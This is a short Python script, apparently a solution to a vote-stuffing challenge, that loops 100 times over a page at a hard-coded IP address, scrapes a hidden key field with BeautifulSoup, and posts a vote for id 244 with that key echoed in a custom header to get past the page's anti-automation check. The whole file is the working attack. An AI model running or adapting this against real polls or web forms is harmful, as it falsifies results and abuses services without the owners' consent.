import requests
from bs4 import BeautifulSoup

# set up our payload and url 
payload = {'id': 244, 'holdthedoor': 'Submit'}
url = "http://158.69.76.135/level1.php"

for i in range(100):
    # get the sites HTML
    site = requests.get(url)
    # scrape the site for its key
    soup = BeautifulSoup(site.text, 'html.parser')
    secret = soup.find('input', attrs={'name':'key'})['value']

    # create and append our header
    headers = {'HoldTheDoor': secret}
    #payload.update({'key': new_cookie})
    r = requests.post(url, data=payload, headers=headers)
